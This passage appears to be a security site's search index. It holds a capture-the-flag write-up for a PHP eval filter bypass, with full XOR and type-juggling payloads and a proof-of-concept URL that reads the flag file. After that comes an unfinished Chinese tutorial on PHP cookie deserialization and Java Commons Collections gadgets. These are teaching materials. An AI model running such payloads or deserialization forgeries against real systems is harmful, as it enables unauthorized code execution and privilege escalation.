!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i)))+((!!@i)))))(); If you paste payload into php script, this will simply call phpinfo(); . We're home! Let's try injecting this into challenge code. The result is... you are so close, omg Of course, I've forgotten about second condition which counts unique characters in our payload. My payload has 15 unique characters, while it accepts only <=13. Let's try to reduce those characters. Firstly, it's safe to remove all @ characters, since it doesn't change anything - just suppresses notices. Fine, this is one character less. Let's try to encode our string once more with less unique characters. To clarify how the script works and decisions here, this is sample output which shows us possibilities of encoding: 1 2 3 4 5 6 7 p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9| h: |Q ^ 9|X ^ 0|Y ^ 1|Z ^ 2| p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9| i: |Q ^ 8|X ^ 1|Y ^ 0|Z ^ 3| n: |V ^ 8|W ^ 9|X ^ 6|Y ^ 7|Z ^ 4| f: |Q ^ 7|R ^ 4|T ^ 2|U ^ 3|V ^ 0|W ^ 1| o: |V ^ 9|W ^ 8|X ^ 7|Y ^ 6|Z ^ 5| Those are possible pairs to encode given character. In order to minimise unique characters, we should choose either: characters which already exist in our payload (TRIM) minimum number of characters with which we can encode all chars (re-use already chosen characters) This way, we encode phpinfo as AYAYYRY ^ 1110746 , and thus generate payload with less than 14 unique chars: 1 (AYAYYRY^trim(((((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i)))+(((!!i+!!i))**((!!i))))))(); Aaaaaand, we get phpinfo() output! POC: 1 http://165.22.57.95:8000/?_=(AYAYYRY^trim(((((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i))))))(); Also, it's worth to mention, that the only char we have to urlencode is + sign - if we urlencode all the characters, we might get 414 request-uri too large for larger payloads. Looking for flag \u00b6 To be honest, I was sure I'm gonna already get the flag at this point. Obviously I was wrong, so I continued research. The very first idea was to print content of current directory (which is often place where flag is stored). In order get dir contents, we have to encode few functions 1 2 3 scandir(string $dir) // returns array of $dir content getcwd() // returns current dir path var_dump($var) // outputs $var content of any type (may be array from scandir) So following string is needed: 1 var_dump(scandir(getcwd())); Again, we encode our stuff, put it into GET parameter and...: 1 array(4) { [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(9) \"index.php\" [3]=> string(34) \"n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt\" } No more words are needed, we simply encode: 1 var_dump(file_get_contents(end(scandir(getcwd())))); and get the flag: 1 string(34) \"ISITDTU{Your PHP skill is so good}\"","title":"Easyphp"},{"location":"web_sec/audit/easyphp/#webshelleasyphp","text":"","title":"webshell\u6784\u9020\u5b9e\u4f8b\u2014\u2014EasyPHP"},{"location":"web_sec/audit/easyphp/#description","text":"Don't try to run any Linux command, just use all the PHP functions you know to get the flag http://165.22.57.95:8000/","title":"Description"},{"location":"web_sec/audit/easyphp/#first-look","text":"\u6e90\u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 <?php highlight_file ( __FILE__ ); $_ = @ $_GET [ '_' ]; if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $_ ) ) die ( 'ros\u00e9 will not do it' ); if ( strlen ( count_chars ( strtolower ( $_ ), 0x3 )) > 0xd ) die ( 'you are so close, omg' ); eval ( $_ ); ?> \u9700\u8981\u7ed5\u8fc7\u4e24\u4e2a\u5224\u65ad\uff0c\u904d\u5386\u4e00\u4e0bphp\u4e2d\u7684\u51fd\u6570\u770b\u4e00\u4e0b\u8fd8\u6709\u54ea\u4e9b\u80fd\u7528 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php $arr = get_defined_functions ()[ 'internal' ]; foreach ( $arr as $key => $value ) { if ( preg_match ( '/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i' , $value ) ){ unset ( $arr [ $key ]); continue ; } if ( strlen ( count_chars ( strtolower ( $value ), 0x3 )) > 0xd ){ unset ( $arr [ $key ]); continue ; } } var_dump ( $arr ); ?> \u5f97\u5230\u5982\u4e0b\u51fd\u6570 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 bcmul rtrim trim ltrim chr link unlink tan atan atanh tanh intval mail min max chr \u548c intval \u53ef\u80fd\u53ef\u4ee5\u5229\u7528\u4f46\u662f\u8fc7\u6ee4\u4e86 .","title":"First look"},{"location":"web_sec/audit/easyphp/#looking-for-a-right-path","text":"How can we generate numbers then? There comes PHP syntax and behaviour with help! Basically in PHP strings have to be quoted using \" or ' . Although those characters are restricted by regex condition, PHP acts in pretty weird way, if we don't quote string - it assumes we've simply forgotten to quote it, produces notice and creates string anyway (only a-ZA-Z characters are valid in this case). Also, notice can be easily suppressed using @ which is permitted by regex. How can we get number from string, though? In this case we can simply use PHP's amazing type juggling: 1 2 3 <?php $a = !!@ i ; echo $a ; // produces boolean(true) String i is casted to false via ! operator, then negated by another ! and we have logical true . Booleans are casted to integer, when any arithmetic is used on them, so we can produce any number we want! For example: 1 2 <?php echo ( !!@ i + !!@ i ) ** ( !!@ i + !!@ i + !!@ i + !!@ i ); //outputs 2^4 = 16 Cool! Now we can create any number and one-char string using chr(asciinumber) function. Another usable PHP feature in our case is that we can call functions using strings. For example \"phpinfo\"(); equals phpinfo(); Now we have one-char-strings and ability to call functions using strings. There are not much one-char functions though - to be specific there's only one: _() which is alias for gettext() function which is used to translate strings. Not very useful. The plan now is to find a way to create string - either by concatenating one-letter strings or any method. I've spent long hours trying to figure out how to concatenate strings without using . operator (which is exactly string concatenation operator, but forbidden by regex), but I've been failing and failing... After hours of struggle, the very next morning I've re-analysed regex condition once again (for like 10 th time), and focused on operators allowed. Those are: ['!', '%', '+', '-', '*', '/', '>', '<', '?', '=', ':', '@', '^'] Eventually I noticed something interesting in PHP documentation: https://www.php.net/manual/en/language.operators.bitwise.php If both operands for the &, | and ^ operators are strings, then the operation will be performed on the ASCII values of the characters that make up the strings and the result will be a string. In all other cases, both operands will be converted to integers and the result will be an integer. This is exactly what we need. ^ stands for bitwise XOR, and if applied on strings, it XORs char by char. I have also tried out some XOR results, and it turned out, that it is possible to create lowercase characters by XORing uppercase character with a number, for example: 1 echo @ASD^\"123\"; //produces string 'paw' We already know how to create string using only permitted characters, and also how to create any number we want. If only number was string representation of integer, we could determine pairs of Uppercase letter ^ [0-9] which XORED result in ANY functions names! Next step is to create string representation for crafted number. Again, PHP type juggling arrives on a white horse yelling for attention: 1 2 <?php var_dump ( trim ( 123 )); //produces string(3) \"123\" trim(string $str) function takes string for argument, and if integer provided, simply casts it to string and returns it trimmed - this is our way to convert crafted numbers to strings.","title":"Looking for a right path"},{"location":"web_sec/audit/easyphp/#exploitation","text":"Off we go, ready and steady to begin exploitation. I've written script which simply iterates through available characters and helps me to find possible Letter ^ [0-9] pairs for each character in provided function name and further generates payload which is encoded function name string. Having this I generated phpinfo(); string: 1 2 \"AQAQVQV\" ^ \"1918879\" //produces 'phpinfo' Payload: (AQAQVQV^trim(((((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i+!!@i)))+(((!!@i+!!@i))**((!!@i)))+((!!@i)))))(); If you paste payload into php script, this will simply call phpinfo(); . We're home! Let's try injecting this into challenge code. The result is... you are so close, omg Of course, I've forgotten about second condition which counts unique characters in our payload. My payload has 15 unique characters, while it accepts only <=13. Let's try to reduce those characters. Firstly, it's safe to remove all @ characters, since it doesn't change anything - just suppresses notices. Fine, this is one character less. Let's try to encode our string once more with less unique characters. To clarify how the script works and decisions here, this is sample output which shows us possibilities of encoding: 1 2 3 4 5 6 7 p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9| h: |Q ^ 9|X ^ 0|Y ^ 1|Z ^ 2| p: |A ^ 1|B ^ 2|C ^ 3|H ^ 8|I ^ 9| i: |Q ^ 8|X ^ 1|Y ^ 0|Z ^ 3| n: |V ^ 8|W ^ 9|X ^ 6|Y ^ 7|Z ^ 4| f: |Q ^ 7|R ^ 4|T ^ 2|U ^ 3|V ^ 0|W ^ 1| o: |V ^ 9|W ^ 8|X ^ 7|Y ^ 6|Z ^ 5| Those are possible pairs to encode given character. In order to minimise unique characters, we should choose either: characters which already exist in our payload (TRIM) minimum number of characters with which we can encode all chars (re-use already chosen characters) This way, we encode phpinfo as AYAYYRY ^ 1110746 , and thus generate payload with less than 14 unique chars: 1 (AYAYYRY^trim(((((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i+!!i)))+(((!!i+!!i))**((!!i+!!i+!!i)))+(((!!i+!!i))**((!!i))))))(); Aaaaaand, we get phpinfo() output! POC: 1 http://165.22.57.95:8000/?_=(AYAYYRY^trim(((((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i%2B!!i%2B!!i)))%2B(((!!i%2B!!i))**((!!i))))))(); Also, it's worth to mention, that the only char we have to urlencode is + sign - if we urlencode all the characters, we might get 414 request-uri too large for larger payloads.","title":"Exploitation"},{"location":"web_sec/audit/easyphp/#looking-for-flag","text":"To be honest, I was sure I'm gonna already get the flag at this point. Obviously I was wrong, so I continued research. The very first idea was to print content of current directory (which is often place where flag is stored). In order get dir contents, we have to encode few functions 1 2 3 scandir(string $dir) // returns array of $dir content getcwd() // returns current dir path var_dump($var) // outputs $var content of any type (may be array from scandir) So following string is needed: 1 var_dump(scandir(getcwd())); Again, we encode our stuff, put it into GET parameter and...: 1 array(4) { [0]=> string(1) \".\" [1]=> string(2) \"..\" [2]=> string(9) \"index.php\" [3]=> string(34) \"n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt\" } No more words are needed, we simply encode: 1 var_dump(file_get_contents(end(scandir(getcwd())))); and get the flag: 1 string(34) \"ISITDTU{Your PHP skill is so good}\"","title":"Looking for flag"},{"location":"web_sec/audit/java/","text":"\u4ece\u53cd\u5e8f\u5217\u5316\u5230\u547d\u4ee4\u6267\u884c - Java \u4e2d\u7684 POP \u6267\u884c\u94fe \u00b6 \u5e8f\u5217\u5316\u5e38\u7528\u4e8e\u5c06\u7a0b\u5e8f\u8fd0\u884c\u65f6\u7684\u5bf9\u8c61\u72b6\u6001\u4ee5\u4e8c\u8fdb\u5236\u7684\u5f62\u5f0f\u5b58\u50a8\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u7136\u540e\u53ef\u4ee5\u5728\u53e6\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\u5bf9\u5e8f\u5217\u5316\u540e\u7684\u5bf9\u8c61\u72b6\u6001\u6570\u636e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u6062\u590d\u5bf9\u8c61\u3002\u7b80\u5355\u7684\u8bf4\u5c31\u662f\u53ef\u4ee5\u57fa\u4e8e\u5e8f\u5217\u5316\u6570\u636e\u5b9e\u65f6\u5728\u4e24\u4e2a\u7a0b\u5e8f\u4e2d\u4f20\u9012\u7a0b\u5e8f\u5bf9\u8c61\u3002 \u5728\u7b2c\u4e00\u6bb5\u4ee3\u7801\u91cc\u9762\uff0c\u7a0b\u5e8f\u5c06\u5b9e\u4f8b\u5bf9\u8c61 String(\"This is String object!\") \u901a\u8fc7 ObjectOutputStream \u7c7b\u7684 writeObject() \u51fd\u6570\u5199\u5230\u4e86\u6587\u4ef6\u91cc\u3002\u5e8f\u5217\u5316\u5bf9\u8c61\u5728\u5177\u6709\u4e00\u5b9a\u7684\u4e8c\u8fdb\u5236\u7ed3\u6784\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u67e5\u770b\u5b58\u50a8\u4e86\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u6587\u4ef6\uff0c\u9664\u4e86\u5305\u542b\u4e00\u4e9b\u5b57\u7b26\u4e32\u5e38\u91cf\u4ee5\u5916\uff0c\u8fd8\u80fd\u770b\u5230\u5176\u5177\u6709\u4e0d\u53ef\u6253\u5370\u7684\u5b57\u7b26\u5728\u91cc\u9762\uff0c\u800c\u8fd9\u4e9b\u5b57\u7b26\u5c31\u662f\u7528\u6765\u63cf\u8ff0\u5176\u5e8f\u5217\u5316\u7ed3\u6784\u7684\u3002 Java \u5e8f\u5217\u5316\u7279\u5f81 \u00b6 \u5728\u5e8f\u5217\u5316\u5bf9\u8c61\u6570\u636e\u4e2d\uff0c\u59344\u4e2a\u5b57\u8282\u5b58\u50a8\u7684\u662f Java \u5e8f\u5217\u5316\u5bf9\u8c61\u6570\u636e\u7279\u6709\u7684 Magic Number \u548c\u76f8\u5e94\u7684\u534f\u8bae\u7248\u672c\uff0c\u901a\u5e38\u4e3a\uff1a 1 2 0xaced (Magic Number) 0x0005 (Version Number) \u5728\u5177\u4f53\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c\u4f1a\u9075\u5faa\u5e8f\u5217\u5316\u534f\u8bae\u8fdb\u884c\u6570\u636e\u5c01\u88c5. \u5217\u5316\u540e\u7684 Java \u5bf9\u8c61\u4e8c\u8fdb\u5236\u6570\u636e\u901a\u5e38\u4ee5 0xaced0005 \u8fd9 4 \u4e2a\u5b57\u8282\u5f00\u59cb\u5c31\u53ef\u4ee5\u4e86\u3002\u5bf9 Java \u5e94\u7528\u5e8f\u5217\u5316\u5bf9\u8c61\u4ea4\u4e92\u7684\u63a5\u53e3\u5bfb\u627e\u5c31\u53ef\u4ee5\u901a\u8fc7\u76d1\u6d4b\u8fd9 4 \u4e2a\u7279\u6b8a\u5b57\u8282\u6765\u8fdb\u884c\u3002 \u5728 Java \u91cc\uff0c\u53ef\u4ee5\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\u6210\u4e3a\u5177\u6709\u4e00\u5b9a\u6570\u636e\u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u4e5f\u53ef\u4ee5\u4ece\u6570\u636e\u6d41\u7a0b\u4e2d\u6062\u590d\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u3002\u800c\u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u4f7f\u7528\u4e24\u4e2a\u7c7b\uff0c\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 // \u5e8f\u5217\u5316\u5bf9\u8c61 java . io . ObjectOutputStream writeObject () writeUnshared () ... // \u53cd\u5e8f\u5217\u5316\u5bf9\u8c61 java . io . ObjectInputStream readObject () readUnshared () ... \u4e5f\u53ef\u4ee5\u5728\u5bf9\u8c61\u4e2d\u91cd\u5199 writeObject() \u548c readObject() \u51fd\u6570\uff0c\u6765\u8fdb\u884c\u4e00\u4e9b\u7279\u6b8a\u7684\u72b6\u6001\u548c\u6570\u636e\u7684\u63a7\u5236\u3002 \u5982\u679c\u6211\u4eec\u9700\u8981\u5bfb\u627e\u67d0\u4e2a Java \u5e94\u7528\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u65f6\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5168\u5c40\u4ee3\u7801\u641c\u7d22\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e2d\u5e38\u7528\u7684\u90a3\u4e9b\u51fd\u6570\u548c\u65b9\u6cd5\uff0c\u5f53\u627e\u5230 Java \u5e94\u7528\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u540e\uff0c\u4fbf\u53ef\u4ee5\u5f00\u59cb\u8003\u8651\u5177\u4f53\u7684\u5229\u7528\u65b9\u6cd5\u4e86\u3002 \u53cd\u5e8f\u5217\u5316\u7684\u5371\u5bb3 \u00b6 \u4e0b\u9762\u662f\u4e00\u6bb5\u4ee3\u7801\u662f PHP \u4ee3\u7801\u4e2d\u5c06\u5e8f\u5217\u5316\u6570\u636e\u4ee5 Cookie \u5f62\u5f0f\u5b58\u50a8\u7684\u5b9e\u4f8b\uff08user.php\uff09\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 <?php class User { public $username = '' ; private $is_admin = false ; function __construct ( $username ) { $this -> username = $username ; } function isAdmin () { return $this -> is_admin ; } } function initUser () { $user = new User ( 'Guest' ); $data = base64_encode ( serialize ( $user )); setCookie ( 'user' , $data , time () + 3600 ); echo '<script>location.href=\"./user.php\"</script>' ; } if ( isset ( $_COOKIE [ 'user' ])) { $user = unserialize ( base64_decode ( $_COOKIE [ 'user' ])); if ( $user ) { if ( $user -> isAdmin ()) { echo 'Welcome Come Back, Admninistrator.' ; } else { echo \"Hello, $user->username .\" ; } } else { initUser (); } } else { initUser (); } \u8fd9\u6bb5\u4ee3\u7801\u5c06\u7528\u6237\u4fe1\u606f\u4ee5 base64_encode(serialize($user)) \u7684\u5f62\u5f0f\u5b58\u50a8\u4e8e\u5ba2\u6237\u7aef\u7684 $_COOKIE['data'] \u91cc\uff0c\u5bf9\u5e8f\u5217\u5316\u654f\u611f\u7684\u90fd\u77e5\u9053\u53ef\u4ee5\u81ea\u5df1\u6784\u9020\u5e8f\u5217\u5316\u5185\u5bb9\u7136\u540e\u4f20\u9012\u7ed9\u670d\u52a1\u7aef\uff0c\u4f7f\u5176\u6539\u53d8\u4ee3\u7801\u903b\u8f91\u3002\u4f7f\u7528\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u751f\u6210 $is_admin = true \u7684\u7528\u6237\u4fe1\u606f\uff1a 1 2 3 4 5 6 7 <?php class User { public $username = 'Guest' ; private $is_admin = true ; } echo base64_encode ( serialize ( new User ())); \u7528\u751f\u6210\u597d\u7684 Payload \u4fee\u6539 Cookie \u540e\u518d\u6b21\u8bbf\u95ee\u5373\u53ef\u770b\u5230 Welcome Come Back, Admninistrator. \u7684\u8f93\u51fa\u4fe1\u606f\u3002 Java \u4e2d\u4e5f\u53ef\u4ee5\u5229\u7528\u53cd\u5e8f\u5217\u5316\u63a7\u5236\u4ee3\u7801\u6d41\u7a0b\uff08\u4f20\u64ad\u7684\u6bd5\u7adf\u662f\u4e00\u4e2a\u5bf9\u8c61\u5b9e\u4f8b\uff09\uff0c \u4f46\u5728 Java \u4e2d\u60f3\u8981\u968f\u4fbf\u53cd\u5e8f\u5217\u5316\u4e00\u4e2a\u7c7b\u5b9e\u4f8b\u662f\u4e0d\u884c\u7684\uff0c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u7684\u7c7b\u5fc5\u987b\u663e\u793a\u58f0\u660e Serializable \u63a5\u53e3\uff0c\u8fd9\u6837\u624d\u5141\u8bb8\u8fdb\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\u3002 \u9762\u5411\u5c5e\u6027\u7f16\u7a0b \u00b6 \u9762\u5411\u5c5e\u6027\u7f16\u7a0b\uff08Property-Oriented Programing\uff09\u5e38\u7528\u4e8e\u4e0a\u5c42\u8bed\u8a00\u6784\u9020\u7279\u5b9a\u8c03\u7528\u94fe\u7684\u65b9\u6cd5\uff0c\u4e0e\u4e8c\u8fdb\u5236\u5229\u7528\u4e2d\u7684\u9762\u5411\u8fd4\u56de\u7f16\u7a0b\uff08Return-Oriented Programing\uff09\u7684\u539f\u7406\u76f8\u4f3c\uff0c\u90fd\u662f\u4ece\u73b0\u6709\u8fd0\u884c\u73af\u5883\u4e2d\u5bfb\u627e\u4e00\u7cfb\u5217\u7684\u4ee3\u7801\u6216\u8005\u6307\u4ee4\u8c03\u7528\uff0c\u7136\u540e\u6839\u636e\u9700\u6c42\u6784\u6210\u4e00\u7ec4\u8fde\u7eed\u7684\u8c03\u7528\u94fe\u3002\u5728\u63a7\u5236\u4ee3\u7801\u6216\u8005\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u540e\u5c31\u80fd\u591f\u4f7f\u7528\u8fd9\u4e00\u7ec4\u8c03\u7528\u94fe\u505a\u4e00\u4e9b\u5de5\u4f5c\u4e86\u3002 Java \u53cd\u5e8f\u5217\u5316\u5229\u7528 \u00b6 InvokerTransformer.transform() \u53cd\u5c04\u8c03\u7528 \u5728\u4f7f\u7528 Apache Commons Collections \u5e93\u8fdb\u884c Gadget \u6784\u9020\u65f6\u4e3b\u8981\u5229\u7528\u4e86\u5176 Transformer \u63a5\u53e3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public interface Transformer { /** * Transforms the input object (leaving it unchanged) into some output object. * * @param input the object to be transformed, should be left unchanged * @return a transformed object * @throws ClassCastException (runtime) if the input is the wrong class * @throws IllegalArgumentException (runtime) if the input is invalid * @throws FunctorException (runtime) if the transform cannot be completed */ public Object transform ( Object input ); } \u4e3b\u8981\u7528\u4e8e\u5c06\u4e00\u4e2a\u5bf9\u8c61\u901a\u8fc7 transform \u65b9\u6cd5\u8f6c\u6362\u4e3a\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u800c\u5728\u5e93\u4e2d\u4f17\u591a\u5bf9\u8c61\u8f6c\u6362\u7684\u63a5\u53e3\u4e2d\u5b58\u5728\u4e00\u4e2a Invoker \u7c7b\u578b\u7684\u8f6c\u6362\u63a5\u53e3 InvokerTransformer \uff0c\u5e76\u4e14\u540c\u65f6\u8fd8\u5b9e\u73b0\u4e86 Serializable \u63a5\u53e3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class InvokerTransformer implements Transformer , Serializable { ... \u7701\u7565 ... private final String iMethodName ; private final Class [] iParamTypes ; private final Object [] iArgs ; public Object transform ( Object input ) { if ( input == null ) { return null ; } try { Class cls = input . getClass (); // \u53cd\u5c04\u83b7\u53d6\u7c7b Method method = cls . getMethod ( iMethodName , iParamTypes ); // \u53cd\u5c04\u5f97\u5230\u5177\u6709\u5bf9\u5e94\u53c2\u6570\u7684\u65b9\u6cd5 return method . invoke ( input , iArgs ); // \u4f7f\u7528\u5bf9\u5e94\u53c2\u6570\u8c03\u7528\u65b9\u6cd5\uff0c\u5e76\u8fd4\u56de\u76f8\u5e94\u8c03\u7528\u7ed3\u679c } catch ( NoSuchMethodException ex ) { ... \u7701\u7565 ... \u53ef\u4ee5\u770b\u5230 InvokerTransformer \u7c7b\u4e2d\u5b9e\u73b0\u7684 transform() \u63a5\u53e3\u4f7f\u7528 Java \u53cd\u5c04\u673a\u5236\u83b7\u53d6\u53cd\u5c04\u5bf9\u8c61 input \u4e2d\u7684\u53c2\u6570\u7c7b\u578b\u4e3a iParamTypes \u7684\u65b9\u6cd5 iMethodName \uff0c\u7136\u540e\u4f7f\u7528\u5bf9\u5e94\u53c2\u6570 iArgs \u8c03\u7528\u83b7\u53d6\u7684\u65b9\u6cd5\uff0c\u5e76\u5c06\u6267\u884c\u7ed3\u679c\u8fd4\u56de\u3002\u7531\u4e8e\u5176\u5b9e\u73b0\u4e86 Serializable \u63a5\u53e3\uff0c\u56e0\u6b64\u5176\u4e2d\u7684\u4e09\u4e2a\u5fc5\u8981\u53c2\u6570 iMethodName \u3001 iParamTypes \u548c iArgs 